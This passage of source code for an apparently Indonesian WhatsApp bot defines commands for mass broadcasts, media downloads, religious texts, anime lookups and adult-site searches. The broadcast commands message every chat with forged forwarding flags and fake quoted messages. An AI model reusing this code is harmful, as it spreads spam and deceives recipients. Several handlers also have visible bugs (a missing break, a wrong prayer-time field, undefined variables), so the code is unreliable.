					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await syaa.downloadAndSaveMediaMessage(enmediau)
					await syaa.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
        case "bc":  
        case "bcimage":  
        case "broadcast":  
                   if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
					if (args.length < 1) return reply('.......')
					ini_bc = args.join(' ')
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					buff = await syaa.downloadMediaMessage(encmedia)
					for (let _ of anu) {
						syaa.sendMessage(_.jid, buff, image, {quoted:fakestatus ,caption: `「  *BROADCAST* 」\n\n${ini_bc}`})
					}
					reply('```Success Broadcast```')
					} else {
					for (let _ of anu) {
					syaa.sendMessage(_.jid, `*BROADCAST*\n${ini_bc}`, text, { contextInfo: { mentionedJid: [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
					}
					reply('```Success Broadcast```')
					}
					break
case 'tobc':
				if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
				syaa.updatePresence(from, Presence.composing)
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, buff, audio, { quoted: fakestatus })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, buff, sticker, { quoted: fakestatus, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
		case "bcsticker":
        case "bcstik":
					if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						reply('Suksess broadcast')
					}
					break
         case "bcvideo":
					if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftroli,caption: `*BROADCAST*\n\n${body.slice(9)}`})
						}
						reply('Suksess broadcast')
					}
					break
					//////////////// LOLAPI ///////////////
					case 'kbbi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} kursi`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=${apikey}&query=${args.join(" ")}`)
                    lila = get_result.result
                    ini_txt = `\`\`\`Kata : ${lila[0].nama}\`\`\`\n`
                    ini_txt += `\`\`\`Kata Dasar : ${lila[0].kata_dasar}\`\`\`\n`
                    ini_txt += `\`\`\`Pelafalan : ${lila[0].pelafalan}\`\`\`\n`
                    ini_txt += `\`\`\`Bentuk Tidak Baku : ${lila[0].bentuk_tidak_baku}\`\`\`\n\n`
                    for (var x of lila) {
                        ini_txt += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
                        ini_txt += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
                        ini_txt += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
                        ini_txt += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
                        ini_txt += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
                    }
                    reply(ini_txt)                   
                    case 'listsurah':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = 'List Surah:\n'
                    for (var x in get_result) {
                        ini_txt += `${x}. ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case 'alquran':
                    if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                    urls = `https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    reply(ini_txt)
                    break
                case 'alquranaudio':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                    surah = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${apikey}`)
                    await syaa.sendMessage(from, ini_buffer, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })
                    break
                case 'asmaulhusna':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    reply(ini_txt)
                    break
                case 'kisahnabi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
                    ini_txt += `Umur : ${get_result.age}\n`
                    ini_txt += `Tempat : ${get_result.place}\n`
                    ini_txt += `Story : \n${get_result.story}`
                    reply(ini_txt)
                    break
                case 'jadwalsholat':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    reply(ini_txt)
                    break

                    // Downloader //
                case 'ytplay':
                    if (args.length == 0) return await reply(`Example: ${prefix + command} melukis senja`)
                    await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${args.join(" ")}`)
                        .then(async(result) => {
                            await fetchJson(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=https://www.youtube.com/watch?v=${result.result[0].videoId}`)
                                .then(async(result) => {
                                    result = result.result
                                    caption = `❖ Title    : *${result.title}*\n`
                                    caption += `❖ Size     : *${result.size}*`
                                    ini_buffer = await getBuffer(result.thumbnail)
                                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek, caption: caption })
                                    get_audio = await getBuffer(result.link)
                                    await syaa.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${result.title}.mp3`, quoted: mek })
                                })
                        })
                    break
                case 'ytsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Published : ${x.published}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
                    }
                    reply(ini_txt)
                    break
                
                case 'telesticker':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${apikey}&url=${ini_url}`)
                    ini_sticker = ini_url.result.sticker
                    for (sticker_ in ini_sticker) {
                        ini_buffer = await getBuffer(ini_sticker[sticker_])
                        await syaa.sendMessage(from, ini_buffer, sticker)
                    }
                    break
                case 'tiktoknowm':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_url = args[0]
                    ini_url = `https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=${ini_url}`
                    get_result = await fetchJson(ini_url)
                    ini_buffer = await getBuffer(get_result.result.link)
                    await syaa.sendMessage(from, ini_buffer, video, { quoted: mek })
                    break
                case 'tiktokmusic':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_link = args[0]
                    get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${apikey}&url=${ini_link}`)
                    await syaa.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek })
                    break
                case 'spotify':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotify?apikey=${apikey}&url=${url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Popularity : ${get_result.popularity}\n`
                    ini_txt += `Preview : ${get_result.preview_url}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link)
                    await syaa.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: mek })
                    break
                case 'spotifysearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotifysearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Artists : ${x.artists}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Preview : ${x.preview_url}\n\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'jooxplay':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jooxplay?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.info.song}\n`
                    ini_txt += `Artists : ${get_result.info.singer}\n`
                    ini_txt += `Duration : ${get_result.info.duration}\n`
                    ini_txt += `Album : ${get_result.info.album}\n`
                    ini_txt += `Uploaded : ${get_result.info.date}\n`
                    ini_txt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBuffer(get_result.image)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    await syaa.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: mek })
                    break
                case 'igdl':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_type = image
                    if (ini_url.includes(".mp4")) ini_type = video
                    ini_buffer = await getBuffer(ini_url)
                    await syaa.sendMessage(from, ini_buffer, ini_type, { quoted: mek })
                    break
                case 'igdl2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/instagram2?apikey=${apikey}&url=${ini_url}`)
                    ini_result = ini_url.result.media
                    for (var x of ini_result) {
                        ini_type = image
                        if (x.includes(".mp4")) ini_type = video
                        ini_buffer = await getBuffer(x)
                        await syaa.sendMessage(from, ini_buffer, ini_type, { quoted: mek })
                    }
                    break
                case 'twtdl':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_url = ini_url[ini_url.length - 1].link
                    ini_buffer = await getBuffer(ini_url)
                    await syaa.sendMessage(from, ini_buffer, video, { quoted: mek })
                    break
                case 'fbdl':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result[0].link
                    ini_buffer = await getBuffer(ini_url)
                    await syaa.sendMessage(from, ini_buffer, video, { quoted: mek })
                    break
                case 'zippyshare':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www51.zippyshare.com/v/5W0TOBz1/file.html`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/zippyshare?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_txt = `File Name : ${ini_url.name_file}\n`
                    ini_txt += `Size : ${ini_url.size}\n`
                    ini_txt += `Date Upload : ${ini_url.date_upload}\n`
                    ini_txt += `Download Url : ${ini_url.download_url}`
                    reply(ini_txt)
                    break
                case 'pinterest':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${apikey}&query=${query}`)
                    ini_url = ini_url.result
                    ini_buffer = await getBuffer(ini_url)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'pinterest2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/pinterest2?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_buffer = await getBuffer(get_result[x])
                        await syaa.sendMessage(from, ini_buffer, image)
                    }
                    break
                case 'pint':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://id.pinterest.com/pin/696580267364426905/`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterestvideo?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result[0]
                    ini_buffer = await getBuffer(ini_url)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'pixiv':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/pixiv?apikey=${apikey}&query=${query}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'pixivdl':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 63456028`)
                    query = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/pixivdl/${pixivid}?apikey=${apikey}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'xhamstersearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xhamstersearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'xhamster':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://xhamster.com/videos/party-with-friends-end-in-awesome-fucking-5798407`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xhamster?apikey=${apikey}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Uploader : ${get_result.author}\n`
                    ini_txt += `Upload : ${get_result.upload}\n`
                    ini_txt += `View : ${get_result.views}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.likes}\n`
                    ini_txt += `Dislike : ${get_result.dislikes}\n`
                    ini_txt += `Comment : ${get_result.comments}\n`
                    ini_txt += "Link : \n"
                    link = get_result.link
                    for (var x of link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'xnxxsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'xnxx':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=${apikey}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break

                    // AniManga //
                case 'character':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Miku Nakano`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/character?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Name : ${get_result.name.full}\n`
                    ini_txt += `Native : ${get_result.name.native}\n`
                    ini_txt += `Favorites : ${get_result.favourites}\n`
                    ini_txt += `Media : \n`
                    ini_media = get_result.media.nodes
                    for (var x of ini_media) {
                        ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
                    }
                    ini_txt += `\nDescription : \n${get_result.description.replace(/__/g, "_")}`
                    thumbnail = await getBuffer(get_result.image.large)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'manga':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Chapters : ${get_result.chapters}\n`
                    ini_txt += `Volume : ${get_result.volumes}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'anime':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Id : ${get_result.id}\n`
                    ini_txt += `Id MAL : ${get_result.idMal}\n`
                    ini_txt += `Title : ${get_result.title.romaji}\n`
                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await syaa.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break
                case 'wait':
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        const filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        const form = new FormData();
                        const stats = fs.statSync(filePath);
                        const fileSizeInBytes = stats.size;
                        const fileStream = fs.createReadStream(filePath);
                        form.append('img', fileStream, { knownLength: fileSizeInBytes });
                        const options = {
                            method: 'POST',
                            credentials: 'include',
                            body: form
                        }
                        get_result = await fetchJson(`https://api.lolhuman.xyz/api/wait?apikey=${apikey}`, {...options })
                        fs.unlinkSync(filePath)
                        get_result = get_result.result
                        ini_video = await getBuffer(get_result.video)
                        ini_txt = `Anilist id : ${get_result.anilist_id}\n`
                        ini_txt += `MAL id : ${get_result.mal_id}\n`
                        ini_txt += `Title Romaji : ${get_result.title_romaji}\n`
                        ini_txt += `Title Native : ${get_result.title_native}\n`
                        ini_txt += `Title English : ${get_result.title_english}\n`
                        ini_txt += `at : ${get_result.at}\n`
                        ini_txt += `Episode : ${get_result.episode}\n`
                        ini_txt += `Similarity : ${get_result.similarity}`
                        await syaa.sendMessage(from, ini_video, video, { quoted: mek, caption: ini_txt })
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
                case 'kusonime':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://kusonime.com/nanatsu-no-taizai-bd-batch-subtitle-indonesia/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonime?apikey=${apikey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    break
                case 'kusonimesearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Genre : ${get_result.genre}\n`
                    ini_txt += `Seasons : ${get_result.seasons}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Total Episode : ${get_result.total_episode}\n`
                    ini_txt += `Score : ${get_result.score}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Released On : ${get_result.released_on}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    link_dl = get_result.link_dl
                    for (var x in link_dl) {
                        ini_txt += `\n${x}\n`
                        for (var y in link_dl[x]) {
                            ini_txt += `${y} - ${link_dl[x][y]}\n`
                        }
                    }
                    ini_buffer = await getBuffer(get_result.thumbnail)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
                    break
                case 'otakudesu':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://otakudesu.tv/lengkap/pslcns-sub-indo/`)
                    ini_url = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesu?apikey=${apikey}&url=${ini_url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Japanese : ${get_result.japanese}\n`
                    ini_txt += `Judul : ${get_result.judul}\n`
                    ini_txt += `Type : ${get_result.type}\n`
                    ini_txt += `Episode : ${get_result.episodes}\n`
                    ini_txt += `Aired : ${get_result.aired}\n`
                    ini_txt += `Producers : ${get_result.producers}\n`
                    ini_txt += `Genre : ${get_result.genres}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Studios : ${get_result.status}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Credit : ${get_result.credit}\n`
                    get_link = get_result.link_dl
                    for (var x in get_link) {
                        ini_txt += `\n\n*${get_link[x].title}*\n`
                        for (var y in get_link[x].link_dl) {
                            ini_info = get_link[x].link_dl[y]
                            ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
                            ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
                            ini_txt += `\`\`\`Link : \`\`\`\n`
                            down_link = ini_info.link_dl
                            for (var z in down_link) {
                                ini_txt += `${z} - ${down_link[z]}\n`
                            }
                        }
                    }
                    reply(ini_txt)
                    break
                case 'otakudesusearch':
